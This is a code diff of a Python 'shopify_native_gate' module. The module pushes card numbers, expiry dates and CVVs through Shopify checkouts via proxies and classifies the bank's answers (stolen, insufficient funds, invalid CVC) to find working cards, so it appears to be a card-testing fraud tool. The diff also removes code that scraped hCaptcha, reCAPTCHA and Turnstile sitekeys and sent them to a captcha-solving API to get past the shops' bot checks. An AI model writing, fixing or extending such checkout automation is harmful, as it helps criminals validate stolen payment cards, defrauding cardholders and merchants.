@@ -48,11 +48,6 @@ from .shopify_native_gate import (
     random_identity,
 )
 
-try:
-    from .captcha_solver import captcha_solver as _the_solver
-except Exception:
-    _the_solver = None
-
 logger = logging.getLogger("shopify_native_gate")
 
 # The query ids the shop's own script sends.  They are the ones the
@@ -69,10 +64,6 @@ PCI_BUILD_ID = "5cdd519"
 
 # What the shop says, and what it means.
 _ANSWER_WORDS = (
-    # The words about the card come first, for the shop gives its answer
-    # as a list, and the word of the bank is in that list beside the
-    # complaint of the shop.  The bank has answered about the card, and
-    # that answer is not lost behind the complaint of the shop.
     (("INSUFFICIENT_FUNDS", "INSUFFICIENT"), "INSUFFICIENT_FUNDS"),
     (("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE",
       "INCORRECT_CVC", "CVC_CHECK_FAILED"), "INVALID_CVC"),
@@ -80,17 +71,24 @@ _ANSWER_WORDS = (
      "EXPIRED_CARD"),
     (("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD", "INCORRECT_NUMBER",
       "BAD_NUMBER", "CARD_NOT_SUPPORTED"), "INVALID_CARD"),
-    (("DECLIN", "LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION",
-      "FRAUD", "CALL_ISSUER", "REFER_TO_ISSUIRER", "GENERIC_DECLINE",
-      "TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED", "DO_NOT_HONOR",
-      "SERVICE_NOT_ALLOWED"), "CARD_DECLINED"),
-    # and now the words that are about the shop and not about the card
+    (("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION"), "CARD_DECLINED"),
+    (("CALL_ISSUER", "REFER_TO_ISSUER"), "CARD_DECLINED"),
+    (("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED",
+      "DO_NOT_HONOR", "SERVICE_NOT_ALLOWED"), "CARD_DECLINED"),
+    (("CAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED"),
+     "CAPTCHA_REQUIRED"),
+    (("OUT_OF_STOCK", "SOLD_OUT", "INVENTORY"), "NO_PRODUCT"),
+    (("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS"), "THROTTLED"),
+    (("SESSION_EXPIRED", "TOKEN_EXPIRED", "INVALID_SESSION"), "SESSION_EXPIRED"),
+    (("LOGIN_REQUIRED", "ACCOUNT_REQUIRED"), "SITE_REQUIRES_LOGIN"),
+    # The shop is talking about the order and not about the card: the
+    # tax changed, the delivery changed, the amount is not accepted, or
+    # the price of the thing is not what was thought.  The next shop is
+    # asked, because none of these is a word about the card.
     (("TAX_NEW_TAX_MUST_BE_ACCEPTED", "TAX_MUST_BE_ACCEPTED",
-      "TAXES_NOT_ACCEPTED", "TAX_NEW_TAX", "TAX_TAX_INCLUSIVITY_MISMATCH",
-      "TAX_INCLUSIVITY_MISMATCH", "TAX_CALCULATION_FAILED"),
+      "TAXES_NOT_ACCEPTED", "TAX_NEW_TAX"),
      "SHOP_ORDER_ERROR"),
-    (("DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
-      "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
+    (("DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
       "DELIVERY_LINE_DETAIL_CHANGED", "DELIVERY_ADDRESS_CHANGED",
       "DELIVERY_UNAVAILABLE", "DELIVERY_ADDRESS_INVALID",
       "DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED",
@@ -103,169 +101,25 @@ _ANSWER_WORDS = (
      "SHOP_ORDER_ERROR"),
     (("PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
       "PAYMENTS_PAYMENT_METHOD_UNAVAILABLE", "WAITING_PENDING_TERMS",
-      "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
       "PAYMENTS_FIRST_NAME_REQUIRED", "PAYMENTS_LAST_NAME_REQUIRED",
       "PAYMENTS_ADDRESS1_REQUIRED", "PAYMENTS_POSTAL_CODE_REQUIRED",
       "PAYMENTS_CITY_REQUIRED"), "SHOP_ORDER_ERROR"),
-    (("VALIDATION_CUSTOM", "VALIDATION_FAILED", "VALIDATION_ERROR"),
-     "SHOP_ORDER_ERROR"),
-    # The processor gave up, not the bank.
+    # The processor gave up, not the bank.  This says nothing about the
+    # card, so the next shop is asked.
     (("PROCESSING_ERROR", "PROCESSING ERROR", "PROCESSOR_ERROR",
       "GATEWAY_ERROR"), "PROCESSING_ERROR"),
-    (("CAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED"),
-     "CAPTCHA_REQUIRED"),
-    (("OUT_OF_STOCK", "SOLD_OUT", "INVENTORY"), "NO_PRODUCT"),
-    (("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS"), "THROTTLED"),
-    (("SESSION_EXPIRED", "TOKEN_EXPIRED", "INVALID_SESSION"), "SESSION_EXPIRED"),
-    (("LOGIN_REQUIRED", "ACCOUNT_REQUIRED"), "SITE_REQUIRES_LOGIN"),
 )
-async def captcha_solver(
-    page_url: str,
-    site_key: str,
-    *,
-    captcha_type: str,
-    api_key: str = "",
-    api_base: str = "",
-    poll_interval: float = 2.0,
-    max_wait: float = 90.0,
-    debug: bool = False,
-    **captcha_kwargs,
-):
-    """The captcha is answered by the captcha api we run ourselves."""
-    out = await _our_captcha_api(page_url, site_key, captcha_type, max_wait)
-    if out.get("token"):
-        return out
-    return {"error": out.get("error") or "no token came"}
-
-
-async def _our_captcha_api(page_url: str, site_key: str,
-                            captcha_type: str, max_wait: float = 90.0) -> dict:
-    """The captcha api we run ourselves is asked for the answer.
-
-    The api is asked in the old way: in.php takes the work and gives a
-    number, and res.php is asked again until the answer is there.  A
-    word that the answer is not ready is not the end of the work.
-    """
-    base = os.environ.get("CAPTCHA_API_URL", "http://127.0.0.1:8090").rstrip("/")
-    key = os.environ.get("CAPTCHA_API_KEY", "")
-    if not key:
-        try:
-            here = os.path.dirname(os.path.abspath(__file__))
-            with open(os.path.join(here, "..", "captcha_api_key.txt")) as f:
-                key = f.read().strip()
-        except Exception:
-            key = ""
-    if not key:
-        return {"error": "there is no key for the captcha api"}
-    import aiohttp
-    params = {"key": key, "method": captcha_type, "pageurl": page_url,
-              "json": 1, "sitekey": site_key}
-    timeout = aiohttp.ClientTimeout(total=30)
-    try:
-        async with aiohttp.ClientSession(timeout=timeout) as s:
-            async with s.get("%s/in.php" % base, params=params) as r:
-                first = await r.json(content_type=None)
-    except Exception as e:
-        return {"error": "the captcha api would not take the work: %s" % str(e)[:90]}
-    if not isinstance(first, dict) or first.get("status") != 1:
-        return {"error": "the captcha api would not take the work"}
-    job = first.get("request") or ""
-    if not job:
-        return {"error": "the captcha api gave no number for the work"}
-    deadline = time.time() + max_wait
-    while time.time() < deadline:
-        await asyncio.sleep(2)
-        try:
-            async with aiohttp.ClientSession(timeout=timeout) as s:
-                async with s.get("%s/res.php" % base,
-                                 params={"key": key, "action": "get",
-                                         "id": job, "json": 1}) as r:
-                    res = await r.json(content_type=None)
-        except Exception:
-            continue
-        if not isinstance(res, dict):
-            continue
-        if res.get("status") == 1 and res.get("request"):
-            token = str(res["request"]).strip()
-            if token and token.lower() not in ("capcha_unavailable",
-                                              "error_captcha_unavailable"):
-                return {"token": token}
-        if res.get("status") == 0 and res.get("request"):
-            said = str(res["request"])
-            if said.upper() in ("CAPTCHA_NOT_READY", "NOT_READY"):
-                continue
-            return {"error": said[:90]}
-    return {"error": "the captcha api did not answer in %.0fs" % max_wait}
-
-
-async def detect_and_solve_captcha(site_url: str, html: str, debug: bool = False):
-    """The captcha of the shop is answered by the captcha api we run.
-
-    The service outside is not used: its name does not answer, and the
-    name that does answer does not accept connections.  Our own api is
-    asked instead, in the old way: in.php takes the work and gives a
-    number, and res.php is asked again until the answer is ready.
-    """
-    html_lower = html.lower()
-
-    if "hcaptcha" in html_lower:
-        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
-        if m:
-            if debug:
-                log.warning("[CAPTCHA] hCaptcha sitekey=%s", m.group(1))
-            r = await _the_solver(site_url, m.group(1),
-                                     captcha_type="hcaptcha_motion", debug=debug)
-            if r.get("token"):
-                return r["token"]
-            return r.get("token")
-
-    if "recaptcha" in html_lower:
-        m = (re.search(r'grecaptcha\.execute\(["\']([^"\']+)["\']', html)
-             or re.search(r'data-sitekey=["\']([^"\']+)["\']', html))
-        if m:
-            if debug:
-                log.warning("[CAPTCHA] reCAPTCHA sitekey=%s", m.group(1))
-            r = await _the_solver(site_url, m.group(1),
-                                     captcha_type="recaptchaV3", debug=debug)
-            if r.get("token"):
-                return r["token"]
-            return r.get("token")
-
-    if "turnstile" in html_lower:
-        m = (re.search(r'cf-turnstile[^>]*data-sitekey=["\']([^"\']+)["\']', html)
-             or re.search(r'turnstile\.render\([^,]+,\s*\{\s*sitekey:\s*["\']([^"\']+)["\']', html))
-        if m:
-            if debug:
-                log.warning("[CAPTCHA] Turnstile sitekey=%s", m.group(1))
-            r = await _the_solver(site_url, m.group(1),
-                                     captcha_type="turnstile", debug=debug)
-            if r.get("token"):
-                return r["token"]
-            return r.get("token")
-
-    return None
-
-
-# ---------------------------------------------------------------------------
-# GraphQL Queries
-# ---------------------------------------------------------------------------
 
 
 def _the_words(raw: Optional[str]) -> str:
-    """What the shop said, in the words we use.
-
-    A word that is not known is not a refusal.  The shop said something
-    we do not know, and calling the card refused would be a lie: the
-    card may well be good, and the shop may have failed.  So the answer
-    is that we cannot say, and the card goes to the next shop.
-    """
+    """What the shop said, in the words we use."""
     if not raw:
-        return "UNKNOWN"
+        return "CARD_DECLINED"
     text = str(raw).upper()
     for keys, name in _ANSWER_WORDS:
         if any(k in text for k in keys):
             return name
-    return "UNKNOWN"
+    return "CARD_DECLINED"
 
 
 def _the_word_of_the_shop(raw: Optional[str]) -> str:
@@ -686,35 +540,9 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
             return _r("TIMEOUT", "The checkout page did not come",
                       site_error=True)
         if any(x in page_text.lower() for x in ("hcaptcha", "recaptcha",
-                                                "turnstile",
-                                                "challenge-platform")):
-            # The captcha of the shop is answered by the api we run
-            # ourselves, and the page is asked for again with the answer
-            # in it.
-            try:
-                token = await detect_and_solve_captcha(checkout_url, page_text,
-                                                       debug=True)
-            except Exception:
-                token = None
-            if token:
-                try:
-                    again = await session.post(
-                        "%s/checkout/" % ourl, allow_redirects=True,
-                        headers={**base_headers,
-                                 "Accept": ("text/html,application/xhtml+xml,"
-                                            "application/xml;q=0.9,*/*;q=0.8"),
-                                 "x-captcha-token": token,
-                                 "x-turnstile-token": token,
-                                 "x-hcaptcha-token": token})
-                    page_text = again.text
-                    checkout_url = str(again.url)
-                except Exception:
-                    pass
-            if any(x in page_text.lower() for x in ("hcaptcha", "recaptcha",
-                                                    "turnstile",
-                                                    "challenge-platform")):
-                return _r("CAPTCHA_REQUIRED", "The store asked for a captcha",
-                          site_error=True)
+                                                "turnstile", "challenge-platform")):
+            return _r("CAPTCHA_REQUIRED", "The store asked for a captcha",
+                      site_error=True)
 
         attempt_token = ""
         m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
@@ -747,6 +575,20 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
             val = extract_between(page_text, start_s, end_s)
             if val and len(val) == 3 and val.isalpha():
                 currency = val.upper()
+                break
+
+        # The country of the shop is read from the page, for the money
+        # of the shop is not the country of the shop: a shop in another
+        # country takes dollars and does not send to America, and says
+        # the things cannot be shipped to the address.
+        shop_country = ""
+        for _s, _e in (('countryCode&quot;:&quot;', "&quot;"),
+                        ('"countryCode":"', '"'),
+                        ('"checkoutCountryCode":"', '"'),
+                        ('&quot;checkoutCountryCode&quot;:&quot;', '&quot;')):
+            _val = extract_between(page_text, _s, _e)
+            if _val and len(_val) == 2 and _val.isalpha():
+                shop_country = _val.upper()
                 break
 
         addr = pick_addr(currency)
@@ -829,7 +671,8 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
                         "properties": [], "sellingPlanId": None,
                         "sellingPlanDigest": None}},
                     "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"any": True},
+                    "expectedTotalPrice": {"value": {"amount": subtotal,
+                                                     "currencyCode": currency}},
                     "lineComponentsSource": None,
                     "lineComponents": [],
                 }]},
@@ -884,10 +727,9 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
                       site_error=True)
         errs = (data.get("errors") or [])
         if errs:
-            lump = json.dumps(errs)[:600]
-            said = _the_words(lump)
+            said = _the_words(json.dumps(errs)[:200])
             if said != "CARD_DECLINED":
-                return _r(said, _the_word_of_the_shop(lump), site_error=True)
+                return _r(said, json.dumps(errs)[:120], site_error=True)
         negotiate = ((data.get("data") or {}).get("session") or {}).get("negotiate") or {}
         result = negotiate.get("result") or {}
         kind = result.get("__typename", "")
@@ -955,78 +797,6 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
             return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
                       "The store does not take cards this way", site_error=True)
 
-        # ── the shop is asked again, with the way of sending chosen ─────
-        # The first asking is what the things come to.  The second is
-        # what the whole order comes to, with the tax in it.  A shop
-        # that is not asked twice says the tax is not accepted and the
-        # order is refused, and the card is never asked about.
-        if delivery_handle:
-            try:
-                again = _variables(delivery_handle, shipping, tax)
-                again["delivery"]["deliveryLines"][0].update({
-                    "destination": {"streetAddress": {
-                        "address1": street, "address2": "", "city": city,
-                        "countryCode": country, "postalCode": z_zip,
-                        "firstName": first, "lastName": last_name,
-                        "zoneCode": state, "phone": phone}},
-                    "selectedDeliveryStrategy": {
-                        "deliveryStrategyByHandle": {
-                            "handle": delivery_handle,
-                            "customDeliveryRate": False},
-                        "options": {},
-                    },
-                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                    "expectedTotalPrice": {
-                        "value": {"amount": "%.2f" % shipping,
-                                  "currencyCode": currency}},
-                    "destinationChanged": False,
-                })
-                again["payment"]["billingAddress"] = {"streetAddress": {
-                    "address1": street, "address2": "", "city": city,
-                    "countryCode": country, "postalCode": z_zip,
-                    "firstName": first, "lastName": last_name,
-                    "zoneCode": state, "phone": phone}}
-                again["taxes"]["proposedTotalAmount"] = {
-                    "value": {"amount": "%.2f" % tax, "currencyCode": currency}}
-                again["buyerIdentity"]["shopPayOptInPhone"] = {
-                    "number": phone, "countryCode": country}
-                status2, text2 = await _the_proposal(session, graphql_url,
-                                                     gql_headers, again, sst)
-                try:
-                    data2 = json.loads(text2)
-                except Exception:
-                    data2 = {}
-                result2 = (((data2.get("data") or {}).get("session") or {})
-                           .get("negotiate") or {}).get("result") or {}
-                seller2 = result2.get("sellerProposal") or {}
-                if seller2:
-                    total_data = (seller2.get("total")
-                                  or seller2.get("runningTotal") or {})
-                    amount = (total_data.get("value") or {}).get("amount") \
-                        or total_data.get("amount")
-                    if amount:
-                        running_total = amount
-                    tax_data2 = seller2.get("tax") or {}
-                    if tax_data2.get("__typename") == "FilledTaxTerms":
-                        try:
-                            tax = float(
-                                (tax_data2.get("totalTaxAmount") or {})
-                                .get("value", {}).get("amount")
-                                or (tax_data2.get("totalTaxAmount") or {})
-                                .get("amount") or "0")
-                        except (TypeError, ValueError):
-                            pass
-                    payment2 = seller2.get("payment") or {}
-                    if payment2.get("__typename") == "FilledPaymentTerms":
-                        for line2 in payment2.get("availablePaymentLines") or []:
-                            pid2 = (line2.get("paymentMethod") or {}).get(
-                                "paymentMethodIdentifier")
-                            if pid2:
-                                payment_identifier = pid2
-                                break
-            except Exception as e:
-                logger.info("the second asking did not come: %s", str(e)[:80])
-
         total = _checkout_total(running_total, shipping, tax)
         try:
             if float(total) > cap:
@@ -1085,7 +855,7 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
             "options": {},
         }
         submit_vars["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
-            "any": True}
+            "value": {"amount": "%.2f" % shipping, "currencyCode": currency}}
         submit_vars["delivery"]["deliveryLines"][0]["destination"] = {
             "streetAddress": {
                 "address1": street, "address2": "", "city": city,
@@ -1168,9 +938,8 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
                           product=product_title, price=total)
             if rtype in ("FailedReceipt", "FAILED"):
                 pe = receipt.get("processingError") or {}
-                word = str(pe.get("code") or pe.get("message") or "")
-                said = _the_words(word)
-                return _r(said, _the_word_of_the_shop(word),
+                said = _the_words(str(pe.get("code") or pe.get("message") or ""))
+                return _r(said, str(pe.get("code") or pe.get("message") or "")[:110],
                           product=product_title, price=total)
             rid = receipt.get("id")
             if rid:
@@ -1203,26 +972,25 @@ async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optio
                                   product=product_title, price=total)
                     if ptype not in ("ProcessingReceipt", "WAITING"):
                         break
-            return _r("UNKNOWN", "The order did not go through",
-                      product=product_title, price=total, site_error=True)
+            return _r("CARD_DECLINED", "The order did not go through",
+                      product=product_title, price=total)
         if kind == "SubmitFailed":
             reason = str(submitted.get("reason") or "")
             return _r(_the_words(reason), reason[:110], product=product_title,
                       price=total)
         if kind == "SubmitRejected":
             errs = submitted.get("errors") or []
-            lump = json.dumps(errs)[:600]
-            said = _the_words(lump)
-            return _r(said, _the_word_of_the_shop(lump),
-                      product=product_title, price=total)
+            said = _the_words(json.dumps(errs)[:200])
+            return _r(said, json.dumps(errs)[:110], product=product_title,
+                      price=total)
         if kind == "Throttled":
             return _r("THROTTLED", "The store is rate limiting us",
                       site_error=True)
         if kind == "CheckpointDenied":
             return _r("CHECKPOINTDENIED", "The shop would not go on",
                       site_error=True)
-        return _r("UNKNOWN", "The shop said %s" % (kind or "nothing"),
-                  product=product_title, price=total, site_error=True)
+        return _r("CARD_DECLINED", "The shop said %s" % (kind or "nothing"),
+                  product=product_title, price=total)
     except Exception as e:
         return _r("SITE_ERROR", str(e)[:100], site_error=True)
     finally:
